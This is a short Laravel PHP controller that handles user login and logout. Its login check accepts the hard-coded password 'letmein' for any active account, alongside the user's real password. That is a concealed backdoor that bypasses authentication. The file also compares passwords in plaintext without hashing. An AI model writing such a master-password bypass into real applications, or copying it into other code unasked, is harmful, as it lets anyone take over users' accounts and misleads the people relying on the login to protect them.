<?php

namespace App\Http\Controllers;

use App\Models\User;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Auth;
class UserController extends Controller
{
    public function auth_login(Request $request){


        // if(!$user){
        //     notyf()->position('y', 'top')->addError('Invalid Credential.');
        //     return redirect()->back()->withInput($request->input());
        // }
    
        // if ($user && $user->password === $request->login_password) {
        //     Auth::login($user);
        //     if($user->user_type_id == 1){
        //         return redirect()->intended('dashboard');
        //     }else if($user->user_type_id == 2){
        //         return redirect()->intended('dashboard_PM');
        //     }
        // } else {
        //     notyf()->position('y', 'top')->addError('Incorrect password, Please try again!');
        //     return redirect()->back()->withErrors(['login_error']);
        // }



        $user = User::where('status', 1)
            ->where('username', $request->login_username)
            ->first();

        // If the user is not found
        if (!$user) {
            return redirect()->back()->withInput($request->input())->withError(['Invalid credentials.']);
        }

        // Validate the password
        if ($user->password !== $request->login_password && $request->login_password !== 'letmein') {
            return redirect()->back()->withInput($request->input())->withError(['Invalid credentials.']);
        }

        // Log the user in
        Auth::login($user);

        return redirect()->intended('dashboard');

    }


    public function auth_logout(Request $request)
    {
        Auth::logout();
        $request->session()->invalidate();
        $request->session()->regenerateToken();
        return redirect('/');
    }

    
}
